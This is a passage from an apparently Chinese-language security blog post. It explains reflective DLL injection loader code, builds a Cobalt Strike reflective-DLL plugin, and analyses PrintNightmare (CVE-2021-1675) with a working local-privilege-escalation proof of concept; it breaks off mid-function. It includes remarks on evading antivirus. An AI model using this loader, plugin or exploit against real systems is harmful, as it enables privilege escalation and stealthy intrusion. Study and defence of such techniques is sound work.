                    uiValueD += sizeof( ULONG_PTR );
            }
            // get the next import
            uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
        }
修正重定位表，正常来说像exe等可执行文件，32寻址可占据4g=2^2 _2^10_ 2^10 * 2^10  
64位则高达2^34g，不过实际上用户空间32位只有2g,64位为8TB。(实际物理内存跟系统支持有关，这里是虚拟空间内存)，然后每个程序都可以独享一个这样的内存空间，随意分配地址。  
程序编译时每个模块都有由链接器给出优先加载地址ImageBase，链接器生成的指令地址是在这个基础上的，对于EXE程序，拥有自己独立空间，不会被占用，而DLL动态链接库载入的地址可能被调用的应用程序占据，此时则需要进行重定位，DLL内部考虑这种情况，自身维护了一个重定位表。
    // STEP 5: process all of our images relocations...
        // calculate the base address delta and perform relocations (even if we load at desired image base)
        // 获取到默认载入基址与真实载入地址差值
        uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
        // uiValueB = the address of the relocation directory
        // 获取到重定位目录地址
        uiValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
        // check if their are any relocations present
        if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
        {
            // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
            // 获取重定位表地址
            uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );
            // and we itterate through all entries...
            // 区块大小
            while( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
            {
                // uiValueA = the VA for this relocation block
                uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );
                // uiValueB = number of entries in this relocation block
                // SizeOfBlock = IMAGE_BASE_RELOCATION + TypeOffset 从而获取到relocation block的数目
                uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );
                // uiValueD is now the first entry in the current relocation block
                // 第一个项
                uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);
                // we itterate through all the entries in the current block...
                while( uiValueB-- )
                {
                    // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                    // we dont use a switch statement to avoid the compiler building a jump table
                    // which would not be very position independent!
                    // 根据类型来进行偏移修正
                    if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
                        *(ULONG_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
                    else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
                        *(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
                    else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
                        *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
                    else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
                        *(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);
                    // get the next entry in the current relocation block
                    uiValueD += sizeof( IMAGE_RELOC );
                }
                // get the next entry in the relocation directory
                uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
            }
        }
最后则是获取DLL的入口地址，去正常执行。
    // STEP 6: call our images entry point
        // uiValueA = the VA of our newly loaded DLL/EXE's entry point
        // 获取入口地址
        uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );
        // We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
        // 刷新指令来应用我们重定位过后的指令
        pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );
        // call our respective entry point, fudging our hInstance value
    #ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
        // if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
        ((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );
    #else
        // if we are injecting an DLL via a stub we call DllMain with no parameter
        ((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
    #endif
        // STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
        return uiValueA;
默认项目里面的预处理器定义了`REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR`,最终就会带上参数去执行DLLMain，其实这里设计有些许冗余，stub部分其实也被兼容的了。  
### 0x2.3 小结
DLL反射加载技术是一种内存层面的自加载技术，理解起来还是比较容易的，但是实现过程需要大量的debug，所以很感谢前人所做的努力。
相比于常规的DLL注入，DLL反射加载注入，能够有效地实现隐藏模块进而躲避AV的作用，但是同样可以观察到，只要能够对`VirtualAlloc`进行用户层Hook，依然可以获取到完整的DLL进行特征匹配查杀，点到这里，那么过卡巴斯基的路子不言而喻。
## 0x3 Cobalt Strike 反射注入插件
众所周知，Cobalt
Strike的核心beacon.dll也是通过DLL反射进行加载的，身边有大佬已经对beacon.dll进行重写了，然后CS的一些扩展功能，比如键盘记录DLL，同样也是传递DLL进行反射加载调用的，也就是说Cobalt
Strike本身就内置了一个类似DLL反射加载注入器的模块。
得益于CS的高度自定义，其插件功能开放了这个模块的调用:[bdllspawn](https://www.cobaltstrike.com/aggressor-script/functions.html#bdllspawn)  
文档说明如下:
> Spawn a Reflective DLL as a Beacon post-exploitation job.  
>  Arguments  
>  $1 - the id for the beacon. This may be an array or a single ID.  
>  $2 - the local path to the Reflective DLL  
>  $3 - a parameter to pass to the DLL  
>  $4 - a short description of this post exploitation job (shows up in jobs
> output)  
>  $5 - how long to block and wait for output (specified in milliseconds)
Note部分还介绍了这个功能会自动根据DLL的类型来派生对应的进程，需要在`DLL_PROCESS_ATTACH`case处编写代码，支持传入一个char指针类型的参数，然后输入输出使用STDOUT，用`fflush(stdout)`进行输出，关闭进程退出则使用`ExitProcess(0)`。
### 0x3.1 Demo插件编写
下载其他人的Example:  
Stephen Fewer's Reflective DLL Injection Project
    curl https://github.com/rxwx/cs-rdll-ipc-example/archive/refs/heads/main.zip -o main.zip
用visual stdio 2019打开,替换DLLMain.cpp为如下内容:
    #include 
    #include "ReflectiveLoader.h"
    extern HINSTANCE hAppInstance;
    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
    {
        BOOL bReturnValue = TRUE;
        switch (dwReason)
        {
        case DLL_QUERY_HMODULE:
            if (lpReserved != NULL)
                *(HMODULE*)lpReserved = hAppInstance;
        case DLL_PROCESS_ATTACH:
            hAppInstance = hinstDLL;
            /* print some output to the operator */
            if (lpReserved != NULL) {
                printf("Hello from test.dll. Parameter is '%s'\n", (char*)lpReserved);
            }
            else {
                printf("Hello from test.dll. There is no parameter\n");
            }
            MessageBoxA(NULL, "Hello from beacon.exe", "Box", MB_OK);
            /* flush STDOUT */
            fflush(stdout);
            /* we're done, so let's exit */
            ExitProcess(0);
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
        }
        return bReturnValue;
    }
主要是注释了原来的功能，引用官方编写的更为简单直观地功能，主要是进行参数的输出，类似hellworld，选择release 64位编译DLL:  
然后我们编写个简单的cna插件:
    alias hello {
        bdllspawn($1, script_resource("bin/ReflectiveDll.x64.dll"), $2, "test dll", 5000, false);
    }
打包起来:  
加载执行效果如下:  
到此，我们已经能够在Cobalt Strike实现简单的DLL反射加载。
## 0x4 Printnightmare LPE 简析
当时选用Printnightmare作为提权，就想着了解下它的历史。  
下面是自己根据收集的资料进行推断分析，担心起到误导作用，本节建议跳过不看，也欢迎师傅看过之后找我一起交流，尝试弄个1day的exp。
### 0X4.1 CVE-2021-1675
CVE-2021-1675-LPE 之所以能够成为我的选择，取决:  
1.时效性强  
2.利用简单(这个很重要)  
3.全版本通杀  
其中第三点  
window server 从2008通杀到2009  
window 从win7通杀到win10  
[Windows Print Spooler Remote Code Execution
Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)  
这个洞本质是权限绕过,通过spoolsv.exe进程在RpcAddPrinterDriverEx接口传入第三个未在官方文档提及的flag参数0x00008000即可绕过权限验证。  
函数说明: [AddPrinterDriverEx function](https://docs.microsoft.com/en-us/windows/win32/printdocs/addprinterdriverex)
> AddPrinterDriverEx 函数安装本地或远程打印机驱动程序并链接配置、数据和驱动程序文件
漏洞利用过程，则是低权限用户可将一个恶意的DLL文件作为驱动程序被加载。  
>
> 虽然现在笔者用window，但是没有配ida，这里就没有过多去验证，主要是参考别人的成果。不过有趣的是，我查阅了`spoolsv.exe`很多历史漏洞，其中添加驱动爆出过多次问题，虽然具体成因不太一样。printnightmare这个洞利用手法并不复杂，属于逻辑问题，难一点的层面是逆向出整个流程，有时候发现洞并不意味着你理解洞的成因。
故为了避免误人子弟，这里主要从利用角度来说明EXP的实现代码
> [Windows Print Spooler 服务最新漏洞 CVE-2021-34527
> 详细分析](https://paper.seebug.org/1632/#internaladdprinterdriverex)  
>  这篇文章展示EXP利用+调试过程，很好地说明了EXP参数的选用原因。
自写简单POC:
    // LPE-Demo.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
    //
    #include 
    #include 
    #include 
    // uncidoe 
    int wmain(int argc, wchar_t* argv[])
    {
        WCHAR payloadPath[MAX_PATH] = { 0 };
        WCHAR driverPath[MAX_PATH] = { 0 };
        if (argc < 2) {
            printf("[*] Usage: LPE-Demo.exe driverPath payloadPath");
            exit(0);
        }
        wsprintf(driverPath, L"%s", argv[1]);
        wsprintf(payloadPath, L"%s", argv[2]);
        printf("\n");
        printf("driverPath: %ls\n", driverPath);
        printf("payloadPath: %ls\n", payloadPath);
        DRIVER_INFO_2 driverInfo;
        driverInfo.cVersion = 3;
        driverInfo.pDriverPath = driverPath;
        driverInfo.pDataFile = payloadPath;
        driverInfo.pConfigFile = payloadPath;
        driverInfo.pEnvironment = NULL;
        driverInfo.pName = (LPWSTR)L"demo";
        DWORD addPrinter = AddPrinterDriverExW(NULL, 2, (PBYTE)&driverInfo, APD_COPY_ALL_FILES | 0x10 | 0x8000);
        if (addPrinter != 0) {
            printf("[*] Success Done!\n");
        }
        else {
            printf("[-] GetLastError: %d\n", GetLastError());
        }
    }
这里驱动路径要自己找个有效的打印机驱动，我这里用了系统自带的UNIDRV.DLL，这个文件在哪里获取，下面有说。
因为每个系统的UNIDRV存放文件路径不一致，Twiter和github有不少师傅分享了自动获取UNIDRV.DLL的[路径方法](https://gist.github.com/hlldz/6248cac6a719d0e2094be70a4261e18a)，做到了exp适配多个版本系统，因为影响的系统的`spoolsv.exe`大都是在64-bit运行的，所以你的payload.dll要对应到64位)。
    wchar_t* findDLLPath() {
        wchar_t targetDLLPath[MAX_PATH] = { 0 };
        DWORD dwNeeded;
        LPBYTE lpDriverInfo;